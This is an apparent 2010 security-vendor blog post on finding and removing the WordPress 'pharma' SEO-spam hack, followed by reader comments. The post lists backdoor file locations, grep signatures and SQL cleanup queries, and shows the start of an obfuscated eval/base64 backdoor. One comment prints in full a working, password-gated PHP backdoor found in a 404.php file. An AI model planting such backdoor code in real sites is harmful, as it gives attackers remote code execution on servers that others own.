<p class="entry-meta"><time class="entry-time" datetime="2010-07-13T12:46:58-07:00">July 13, 2010</time><span class="entry-author"><a href="https://blog.sucuri.net/author/dd" class="entry-author-link" rel="author"><span class="entry-author-name">David Dede</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2010%2F07%2Funderstanding-and-cleaning-the-pharma-hack-on-wordpress.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Understanding%20and%20Cleaning%20the%20Pharma%20Hack%20on%20WordPress&url=https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p>This post is very specific to one type of infection, <a href="https://sucuri.net/website-antivirus/malware-removal/" target="_blank" rel="noopener">there are many different types of infections and symptoms</a>, do not be discouraged if the scenario does not fit your situation. There are <a href="https://blog.sucuri.net/2016/09/cleaning-the-wp-page-pharma-hack-in-wordpress.html" target="_blank" rel="noopener">more recent posts on what pharma hacks</a> look like in 2016.</p>
<p>A more detailed guide on <a href="https://sucuri.net/guides/how-to-clean-hacked-wordpress" target="_blank" rel="noopener">how to address a hack in WordPress</a> was released in 2016.</p>
<hr />
<p>In the last few weeks, the most common questions we&#8217;re receiving are related to the &#8220;pharma&#8221; (or blackhat SEO spam) hack on WordPress sites.</p>
<p>This attack is very interesting because it is not visible to the normal user and the spam (generally about Viagra, Nexium, Cialis, etc) only shows up if the user agent is from Google&#8217;s crawler (googlebot). Also, the infection is a bit tricky to remove and if not done properly will keep reappearing.</p>
<p>Because of this behavior, many sites have been compromised for months with those spam keywords and no one is noticing. A quick way to check if your site is compromised is by searching on Google for <strong>&#8220;inurl:yoursite.com cheap viagra or cheap cialis&#8221;</strong> or using our <a href="https://sitecheck.sucuri.net/" target="_blank" rel="noopener">free security scanner</a>.</p>
<p>For example, this is the result of our scanner against wpremix.com (which was infected at the time we were writing this post):</p>
<h2><a href="https://2.bp.blogspot.com/_w4XYN7NmRts/TDurr92BhEI/AAAAAAAAAIo/RVzv67KKgAg/s1600/Picture+14.png"><img loading="lazy" class="aligncenter" title="wpremix spam hacked" src="https://2.bp.blogspot.com/_w4XYN7NmRts/TDurr92BhEI/AAAAAAAAAIo/RVzv67KKgAg/s1600/Picture+14.png" alt="wpremix spam hacked" width="729" height="394" /></a>Pharma Hack &#8211; Details</h2>
<p>The pharma hack has various moving parts:</p>
<ol>
<li>Backdoor that allows the attackers to insert files and modify the database.</li>
<li>Backdoor inside one (or more) plugins to insert the spam.</li>
<li>Backdoor inside the database used by the plugins.</li>
</ol>
<p>If you fix one of the three, but forget about the rest, you&#8217;ll <strong>most likely be reinfected</strong> and the spam will continue to be indexed.</p>
<p>As always, we recommend that you update your WordPress instance to the latest version. This goes for all of your plugins, themes, etc. WordPress is typically very secure, it&#8217;s when you&#8217;re running old versions and out of date plugins/themes that run into trouble. <strong>Keep your stuff up to date</strong> to minimize the risk of infection significantly.</p>
<h2>1. Backdoor Gives Remote Access to Users</h2>
<p>This is the first step in the infection. Generally, attackers do large scale scans and try to inject the backdoors into compromised sites. They do this by searching for vulnerable WordPress installations (older versions), vulnerable plugins, hosting companies with known security weaknesses, etc.</p>
<p>When the backdoor is added, it is not immediately executed. Sometimes it stays for months without ever getting called. The common places for these backdoors are:</p>
<pre>wp-content/uploads/.*php (random PHP name file)
 wp-includes/images/smilies/icon_smile_old.php.xl
 wp-includes/wp-db-class.php
 wp-includes/images/wp-img.php</pre>
<p>Characteristically in the past, these files have had an &#8220;eval(base64_decode&#8221;, ultimately that&#8217;s what most people recommend searching for. However, on the pharma attack, the backdoor starts with:</p>
<pre>&lt; ? php $XZKsyG='as';$RqoaUO='e';$ygDOEJ=$XZKsyG.'s'.$RqoaUO.'r'.'t';$joEDdb
 ='b'.$XZKsyG.$RqoaUO.(64).'_'.'d'.$RqoaUO.'c'.'o'.'d'.$RqoaUO;@$ygDOEJ(@$j
 oEDdb('ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lvYVhOelpY... (long long string)..</pre>
<p>So, it still calls <strong>eval(base64_decode</strong> but using variables making it harder to detect. In fact, none of the WordPress security plugins are able to find it. Our suggestion is to search for this string: <strong>php $[a-zA-Z]*=&#8217;as&#8217;;</strong></p>
<p>If you do an inspection of the code, you will see that it scans for wp-config.php, gets the database information, acts as a remote shell and retrieves a lot of information about the system.</p>
<p>That&#8217;s the first thing you have to remove before you do anything else.</p>
<h2>2. Backdoor Inside One of the Plugins</h2>
<p>This is the second part of the attack. After successfully creating a backdoor into the system, a file will be created inside one of the existing plugins. Example:</p>
<pre>akismet/wp-akismet.php
 akismet/db-akismet.php
 wp-pagenavi/db-pagenavi.php
 wp-pagenavi/class-pagenavi.php
 podpress/ext-podpress.php
 tweetmeme/ext-tweetmeme.php
 excerpt-editor/db-editor.php
 akismet/.akismet.cache.php
 akismet/.akismet.bak.php
 tweetmeme/.tweetmem.old.php</pre>
<p>Note that they will infect one or more of your enabled plugins and use names like <strong>wp-[plugin].php, db-[plugin].</strong>php<strong>, ext-[plugin].php,</strong> or something similar. We do not recommend you rely only those samples for your search, but try looking for any plugin file with the <strong>wp_class_support</strong> string on it.</p>
<pre><b>$ grep -r "wp_class_support" ./wp-content/plugins</b></pre>
<p>If you are infected, you will see things like (full content of the file):</p>
<pre>./wp-content/plugins/akismet/db-akismet.php:if(!defined('wp_class_support')) {
 ./wp-content/plugins/akismet/db-akismet.php: define('wp_class_support',true);</pre>
<p>Make sure to remove those files. To be <strong>100% sure your plugins are clean</strong>, I would recommend removing all of them and adding from scratch (not possible for all sites, but this is probably the most secure way of doing it).</p>
<h2>3. Backdoor Inside the Database</h2>
<p>This is the last step, and equally important. This is where the spam itself is hidden. They have been using the <strong>wp_options</strong> table with these names in the <strong>option_name</strong>:</p>
<pre>wp-options -&gt; class_generic_support
 wp-options -&gt; widget_generic_support
 wp-options -&gt; wp_check_hash
 wp-options -&gt; rss_7988287cd8f4f531c6b94fbdbc4e1caf
 wp-options -&gt; rss_d77ee8bfba87fa91cd91469a5ba5abea
 wp-options -&gt; rss_552afe0001e673901a9f2caebdd3141d</pre>
<p>Some people have been seeing <strong>fwp</strong> and <strong>ftp_credentials</strong> being used as well, so check there too.</p>
<p>These SQL queries should clean your database:</p>
<pre>delete from wp_options where option_name = 'class_generic_support';
 delete from wp_options where option_name = 'widget_generic_support';
 delete from wp_options where option_name = 'fwp';
 delete from wp_options where option_name = 'wp_check_hash';
 delete from wp_options where option_name = 'ftp_credentials';
 delete from wp_options where option_name = 'rss_7988287cd8f4f531c6b94fbdbc4e1caf';
 delete from wp_options where option_name = 'rss_d77ee8bfba87fa91cd91469a5ba5abea';
 delete from wp_options where option_name = 'rss_552afe0001e673901a9f2caebdd3141d';</pre>
<h2>Conclusion</h2>
<p>Tricky stuff! The attackers are getting better and we have to learn how to <a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" target="_blank" rel="noopener">protect our sites and servers</a>. If you need any help cleaning up the mess or you need a partner to help with your security needs, Sucuri is here to assist.</p>
<p>Protect your interwebs!</p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2010%2F07%2Funderstanding-and-cleaning-the-pharma-hack-on-wordpress.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Understanding%20and%20Cleaning%20the%20Pharma%20Hack%20on%20WordPress&url=https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/wordpress-security" rel="category tag">WordPress Security</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/black-hat-tactics" rel="tag">Black Hat Tactics</a>, <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a>, <a href="https://blog.sucuri.net/tag/malware-cleanup" rel="tag">Malware Cleanup</a>, <a href="https://blog.sucuri.net/tag/seo-spam" rel="tag">SEO Spam</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/f7105dd5dc850e545047cfa4477d2343?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f7105dd5dc850e545047cfa4477d2343?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">David Dede</span></h4><div class="author-box-content" itemprop="description"><p>David is a Security Researcher at Sucuri. He spends most of his time dissecting vulnerabilities and security issues. You won't find him on Twitter because he is paranoid about privacy.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-1222">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ba37ad56f95b7a528f13b2adad8878f4?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ba37ad56f95b7a528f13b2adad8878f4?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://twitter.com/alanpca" class="comment-author-link" rel="external nofollow" itemprop="url">@alanpca</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-07-13T22:44:13-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1222">July 13, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I wrote a similar article today: <a href="http://alanp.ca/blog/2010/07/13/unobfuscating-an-attack/" target="_blank" rel="nofollow"></a><a href="http://alanp.ca/blog/2010/07/13/unobfuscating-an-" rel="nofollow ugc">http://alanp.ca/blog/2010/07/13/unobfuscating-an-</a>&#8230;<br />
My recent post <a href="http://alanp.ca/blog/2010/07/13/unobfuscating-an-attack/" target="_blank" rel="nofollow">Unobfuscating an Attack</a> </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1225">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4bf19e239d71317c51a82e555e40815e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4bf19e239d71317c51a82e555e40815e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Emre</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-07-17T16:23:21-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1225">July 17, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I had to analyze a quite similar infection in one of our e107 powered sites. Just wanted to add to your great article that this is not only wordpress installations are infected by Pharma, but e107 installations as well.  </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1227">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/00ab97443254b4b4dbfa5a60961e8862?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/00ab97443254b4b4dbfa5a60961e8862?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Joe</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-07-19T09:24:53-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1227">July 19, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for a great article, hope I finally got rid of these pesky Pharma ads in my search results! </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1228">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7ab4bf405b0d7ea039e17969fb1c5037?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7ab4bf405b0d7ea039e17969fb1c5037?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Beng Hafner</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-07-29T11:47:41-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1228">July 29, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thank you very much! Your article helped me a lot </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1229">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e938de5954a96e2912eb6f05304d7b34?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e938de5954a96e2912eb6f05304d7b34?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://intensedebate.com/profiles/loeonehub" class="comment-author-link" rel="external nofollow" itemprop="url">loeonehub</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-07-29T21:26:05-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1229">July 29, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#039;ve seen a backdoor in 404.php </p>
<p>Looks like:<br />
&lt;?php /*xyz*/ $mar = &#039;archo&#039;; $a =<br />
&#039;m&#039;.&#039;d5&#039;;if($a($_REQUEST[$a])==&#039;698357e86842&#039;.&#039;1222bcf89349bd5cf34d&#039;){$w<br />
= &#039;Cdbl0sYoWOiyJt3qtqyOoqxA&#039;;$x = $_REQUEST[$w];$y = &#039;base&#039;.&#039;6&#039;;$y.=<br />
&#039;4_d&#039;.&#039;ecode&#039;;$x = $y($x);$z = &#039;creat&#039;.&#039;e_f&#039;;$z.= &#039;unction&#039;;$x =<br />
$z(&#039;&#039;,$x);$x();} /*xyz*/ ?&gt; </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-4799">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dd86e2b206efcfb77fc40b7ec6cfe766?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dd86e2b206efcfb77fc40b7ec6cfe766?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://twitter.com/01101101" class="comment-author-link" rel="external nofollow" itemprop="url">BinaryM Inc.</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-01-07T00:08:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4799">January 7, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>i&#8217;m seeing the same thing in searchform.php.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-4887">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b317018ce77827f4fda8e92caebdc651?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b317018ce77827f4fda8e92caebdc651?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.facebook.com/s.malliet" class="comment-author-link" rel="external nofollow" itemprop="url">Stefan Malliet</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-03-31T00:51:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4887">March 31, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Just saw a similar chunk of code in the functions.php of the &#8220;Classic&#8221; theme:</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1234">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo avatar-default' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://twitter.com/jjwhite" class="comment-author-link" rel="external nofollow" itemprop="url">@jjwhite</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-08-31T15:24:30-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1234">August 31, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>This was a life saver. Thank You! </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1236">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/34bedd1bd1619abc7f9c9ab0eb07f584?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/34bedd1bd1619abc7f9c9ab0eb07f584?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">John Adams</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-09-01T16:22:49-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1236">September 1, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks Andrew. I found it too. What should I do? Delete the entire 404.php file from the current them or just clean it by wiping out this part of the code? </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1237">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/0bd0107b3fae8eddf7530b0d5b109691?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0bd0107b3fae8eddf7530b0d5b109691?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">jsmarr</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-09-08T12:01:03-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1237">September 8, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Super helpful, thanks! I tried and failed previously to get this exploit out of my blog, but the latest exploit scanner plugin pointed to this blog, and sure enough, I had an infected plugin and several bad wp_options rows. I think it&#039;s finally cleaned out. Thanks again for posting this! </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1238">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/c481dab32e61bfe82c53d2be1fd6e5ca?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c481dab32e61bfe82c53d2be1fd6e5ca?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://tom.goskar.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Tom Goskar</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-09-17T06:32:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1238">September 17, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for the info &#8211; it was very useful for me to remove the hack.  </p>
<p>In my case I removed all WordPress core files, uploaded them afresh, and replaced my plugins. Strangely I didn&#039;t have anything in my database that matched the patterns above, but I had a good clean out of the wp-options table &#8211; so many years of database cruft left over from old plugins and themes.  </p>
<p>Database cleanliness is a new part of my WordPress maintenance regime!<br />
My recent post <a href="http://feedproxy.google.com/~r/tomgoskar/~3/VARRPdxaxKo/" rel="nofollow">HTC Desire Android 22 &lsquo;Froyo&rsquo; Update stops internet access</a> </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-4938">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/58281d98d2cef49f0f881f9f4ce30610?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/58281d98d2cef49f0f881f9f4ce30610?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">wanderrgirl</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-05-28T13:44:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4938">May 28, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi, I&#8217;m sorry if this will sound like such a basic question &#8211; but I&#8217;m not taking any chances anymore. What do you mean by &#8220;removing all WordPress core files&#8221; and &#8220;uploading them afresh&#8221;? How do I do this?</p>
<p>My webhost is recommending that I recreate my account which, if it is as they say, will be like starting the website from scratch. </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-1256">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/77dd0e1d985386d681d09ee2d2d976e2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/77dd0e1d985386d681d09ee2d2d976e2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.rohitclub.com" class="comment-author-link" rel="external nofollow" itemprop="url">Rohit Club</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2010-09-25T14:23:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1256">September 25, 2010</a></time></p>		</header>

		<div class="comment-content">
			
			<p>thanks 4 gr8 info..</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-4811">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/cded8a1473ae277a3fcb79c8ac839bec?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/cded8a1473ae277a3fcb79c8ac839bec?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.cleaninghouselondon.co.uk" class="comment-author-link" rel="external nofollow" itemprop="url">cleaning services London</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-02-10T19:48:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4811">February 10, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>me 3. i didn&#8217;t know how to do this.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-4879">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1cf9e986236c8c48155bf133c74792cb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1cf9e986236c8c48155bf133c74792cb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Tom</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-03-28T21:12:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4879">March 28, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;ve also discovered malicious code planted in unused theme folders, in the 404.php and footer.php files. I traced these when I found a request to /unusedtheme/404.php in a server log. It had a line of semi-obfuscated code with md5 and base64_decode functions. Details at <a href="http://tom-mcgee.com/blog/archives/4112" rel="nofollow ugc">http://tom-mcgee.com/blog/archives/4112</a>.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-4931">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/caef8de5151d613697e948c3442cd21a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/caef8de5151d613697e948c3442cd21a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://pointandshootcamera.co.cc" class="comment-author-link" rel="external nofollow" itemprop="url">Point and Shoot Camera</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-05-20T10:36:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4931">May 20, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>my blog infected by Pharma hack, i found my index.php file on wp-content/uploads encoded by ioncube, then i clean all my server and install new wp blog.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-4935">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/460cd078162da36fa356e382f20c9e25?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/460cd078162da36fa356e382f20c9e25?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://profiles.google.com/nizaminz" class="comment-author-link" rel="external nofollow" itemprop="url">Agus Nizami</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-05-27T03:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4935">May 27, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Well, finally I have found the solution. At least some keywords don&#8217;t show up Cialis no more.<br />
You should go to webftp and find the files that contain Drugstore and eval (gzinflate(base64_decode(.<br />
Delete the files if the files are not wordpress file and remove the virus line in wordpress file such as wp-config.php.</p>
<p>You could read the detail here:<br />
<a href="http://agusnizami.wordpress.com/2011/05/27/cialis-found-on-wordpress-google-search-and-the-solution-to-remove-the-virus/" rel="nofollow ugc">http://agusnizami.wordpress.com/2011/05/27/cialis-found-on-wordpress-google-search-and-the-solution-to-remove-the-virus/</a></p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-4952">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/08b339b66d65f7ad3c43e9a473e8a854?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/08b339b66d65f7ad3c43e9a473e8a854?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.cottonrohrscheib.com" class="comment-author-link" rel="external nofollow" itemprop="url">Cotton Rohrscheib</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-06-15T18:26:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-4952">June 15, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We just stumbled upon this today ourselves. What strikes me as odd is how it is concealed to everyone except the search engines. Doesn&#8217;t look like too much fun to clean up either. </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

